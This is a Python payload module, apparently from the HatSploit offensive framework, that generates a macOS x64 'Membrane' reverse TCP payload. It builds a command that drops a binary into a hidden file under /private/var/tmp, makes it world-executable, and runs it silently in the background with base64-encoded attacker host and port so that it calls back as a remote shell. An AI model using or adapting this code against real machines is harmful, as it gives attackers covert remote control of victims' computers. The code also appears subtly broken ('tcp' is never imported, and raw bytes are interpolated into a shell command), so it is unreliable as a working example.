#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import base64

from core.lib.payload import HatSploitPayload

class HatSploitPayload(HatSploitPayload):
    details = {
        'Name': "macOS x64 Membrane Reverse TCP",
        'Payload': "macos/x64/membrane_reverse_tcp",
        'Authors': [
            'enty8080'
        ],
        'Description': "Membrane Reverse TCP Payload for macOS x64."
    }
    
    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': tcp.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def generate(self):
        local_host, local_port = self.parser.parse_options(self.options)

        remote_data = base64.b64encode((local_host + ':' + local_port).encode())
        remote_data = remote_data.decode()

        self.badges.output_process("Generating payload...")
        binary = open('external/bin/macos_membrane_x64.bin', 'rb')
        payload = binary.read()
        binary.close()

        execute = ""
        execute += f"cat {payload} > /private/var/tmp/.payload;"
        execute += f"chmod 777 /private/var/tmp/.payload;"
        execute += f"sh -c '/private/var/tmp/.payload {remote_data}' 2>/dev/null &"

        self.data['payload'] = payload
        self.data['execute'] = execute

        return self.data
